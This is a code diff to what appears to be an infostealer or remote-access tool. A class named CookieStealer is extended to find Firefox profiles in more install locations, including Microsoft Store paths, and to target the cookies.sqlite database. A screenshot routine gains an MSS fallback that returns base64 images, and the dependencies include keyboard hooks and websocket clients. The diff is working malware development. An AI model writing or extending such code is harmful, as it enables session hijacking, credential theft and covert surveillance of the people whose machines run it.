@@ -23,7 +23,8 @@ required_modules = [
     ('psutil', None),
     ('keyboard', 'pynput'),
     ('socketio', 'python-socketio'),
-    ('websocket', 'websocket-client')
+    ('websocket', 'websocket-client'),
+    ('mss', None)
 ]
 
 # Check and install missing modules
@@ -185,7 +186,10 @@ class CookieStealer:
         self.EDGE_USER_DATA_DIR = rf'{{os.getenv("LOCALAPPDATA")}}\Microsoft\Edge\User Data'
         self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')
 
-        self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+        self.FIREFOX_PROFILE_DIRS = [
+            os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'Mozilla.Firefox_*', 'LocalCache', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
+        ]
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
 
     def steal_cookies(self):
@@ -416,11 +420,50 @@ class CookieStealer:
                 ws.close()
 
     def _find_firefox_profile(self):
-        """Find Firefox profile directory"""
+        """Find Firefox profile directory, checking multiple possible locations"""
         try:
-            for profile in os.listdir(self.FIREFOX_PROFILE_DIR):
-                if profile.endswith('.default-release'):
-                    return os.path.join(self.FIREFOX_PROFILE_DIR, profile)
+            all_profiles = []
+
+            # Check all possible Firefox profile directories
+            for profile_dir in self.FIREFOX_PROFILE_DIRS:
+                try:
+                    # Handle wildcard in path for Microsoft Store Firefox
+                    if '*' in profile_dir:
+                        import glob
+                        matching_dirs = glob.glob(profile_dir)
+                        for matched_dir in matching_dirs:
+                            if os.path.exists(matched_dir):
+                                for item in os.listdir(matched_dir):
+                                    profile_path = os.path.join(matched_dir, item)
+                                    if os.path.isdir(profile_path):
+                                        all_profiles.append(profile_path)
+                    else:
+                        if os.path.exists(profile_dir):
+                            for item in os.listdir(profile_dir):
+                                profile_path = os.path.join(profile_dir, item)
+                                if os.path.isdir(profile_path):
+                                    all_profiles.append(profile_path)
+                except Exception as e:
+                    self._log('error', f"Error checking profile directory {{profile_dir}}: {{str(e)}}")
+                    continue
+
+            if not all_profiles:
+                return None
+
+            # First, try to find profiles with cookies.sqlite (indicating active profiles)
+            for profile in all_profiles:
+                cookies_db = os.path.join(profile, 'cookies.sqlite')
+                if os.path.exists(cookies_db):
+                    self._log('info', f"Found Firefox profile with cookies: {{profile}}")
+                    return profile
+
+            # If no profile has cookies.sqlite, return the most recently modified profile
+            # (Firefox may create profiles that haven't been used yet)
+            if all_profiles:
+                most_recent = max(all_profiles, key=os.path.getmtime)
+                self._log('info', f"Using most recent Firefox profile: {{most_recent}}")
+                return most_recent
+
             return None
         except Exception as e:
             self._log('error', f"Failed to find Firefox profile: {{str(e)}}")
@@ -568,26 +611,51 @@ class SystemUtils:
         logger = logging.getLogger('SystemUtils')
         try:
             logger.debug("Attempting to take screenshot")
-            
-            # Handle Windows display environment if needed
-            if platform.system() == 'Windows':
-                logger.debug("Windows system detected, setting DISPLAY environment")
-                os.environ['DISPLAY'] = ':0.0'
-            
-            logger.debug("Capturing screen with pyautogui")
-            screenshot = pyautogui.screenshot()
-            
-            logger.debug("Converting screenshot to bytes buffer")
-            buffered = io.BytesIO()
-            screenshot.save(buffered, format="PNG")
-            buffered.seek(0)
-            
-            logger.debug("Encoding screenshot to base64")
-            screenshot_data = base64.b64encode(buffered.read()).decode('utf-8')
-            
-            logger.debug("Screenshot captured and encoded successfully")
-            return screenshot_data
-            
+
+            # Try pyautogui first
+            try:
+                logger.debug("Capturing screen with pyautogui")
+                screenshot = pyautogui.screenshot()
+
+                logger.debug("Converting screenshot to bytes buffer")
+                buffered = io.BytesIO()
+                screenshot.save(buffered, format="PNG")
+                buffered.seek(0)
+
+                logger.debug("Encoding screenshot to base64")
+                screenshot_data = base64.b64encode(buffered.read()).decode('utf-8')
+
+                logger.debug("Screenshot captured and encoded successfully")
+                return screenshot_data
+            except Exception as e:
+                logger.warning(f"PyAutoGUI screenshot failed: {{str(e)}}, trying MSS fallback")
+
+                # Fallback to MSS - import here to avoid global scope issues
+                try:
+                    import mss
+                    import mss.tools
+
+                    logger.debug("Using MSS for screenshot capture")
+                    with mss.mss() as sct:
+                        # Capture the entire virtual screen (all monitors)
+                        monitor = sct.monitors[0]  # Primary monitor
+                        screenshot = sct.grab(monitor)
+
+                        # Convert to PNG bytes
+                        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+
+                        # Encode to base64
+                        screenshot_data = base64.b64encode(png_bytes).decode('utf-8')
+
+                        logger.debug("Screenshot captured with MSS and encoded successfully")
+                        return screenshot_data
+                except ImportError:
+                    logger.error("MSS not available for screenshot fallback")
+                    return None
+                except Exception as mss_error:
+                    logger.error(f"MSS screenshot failed: {{str(mss_error)}}")
+                    return None
+
         except ImportError as e:
             logger.error(f"Required library not available: {{str(e)}}", exc_info=True)
             return None
